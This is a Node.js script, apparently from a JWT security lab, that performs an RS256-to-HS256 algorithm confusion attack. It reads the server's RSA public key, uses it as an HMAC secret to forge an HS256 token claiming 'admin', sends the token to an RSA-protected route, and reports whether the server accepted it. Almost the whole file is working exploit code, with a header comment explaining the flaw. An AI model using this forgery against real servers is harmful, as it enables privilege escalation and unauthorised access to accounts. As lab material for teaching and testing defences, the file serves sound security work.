/*
 * ATTACK 03 — RS256 -> HS256 algorithm confusion
 * -----------------------------------------------
 * Root cause: the server verifies with the RSA PUBLIC key but does not pin the
 * algorithm. The public key is, by design, known to everyone. An attacker
 * crafts an HS256 token using the PUBLIC KEY STRING as the HMAC secret. A naive
 * verifier calls verify(token, publicKey) and, seeing alg=HS256 in the header,
 * runs HMAC-SHA256 with that same public-key string as the key — which matches.
 *
 * Run:  node attacks/03-algorithm-confusion.js
 */
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const { post, getAuth, banner, show, verdict, decodeJwt } = require('./_lib');

(async () => {
  banner('ATTACK 03 — algorithm confusion (RS256 -> HS256)');

  // (a) Get a legitimate RS256 token as a baseline.
  const login = await post('/rsa-login', { username: 'alice', password: 'password1' });
  if (login.body.token) { show('Legit RS256 token', login.body.token); show('Decoded', decodeJwt(login.body.token)); }
  else { show('RS256 login (not available on this server)', login); }

  // (b) The public key is public. Use it as an HMAC secret to forge an HS256 token.
  const publicKey = fs.readFileSync(path.join(__dirname, '..', 'keys', 'public.pem'), 'utf8');
  const forged = jwt.sign({ sub: 'attacker', role: 'admin' }, publicKey, { algorithm: 'HS256' });
  show('Forged HS256 token (HMAC key = RSA public key)', forged);
  show('Decoded header/payload', decodeJwt(forged));

  // (c)+(d) Send to the RSA-protected route.
  const res = await getAuth('/rsa-profile', forged);
  show(`Server response  (HTTP ${res.status})`, res.body);
  const ok = res.status === 200 && res.body && res.body.user && res.body.user.role === 'admin';
  verdict(ok, ok ? 'server verified an HS256 forgery using the public key.'
               : 'server rejected the confused token (algorithm pinned).');
})();
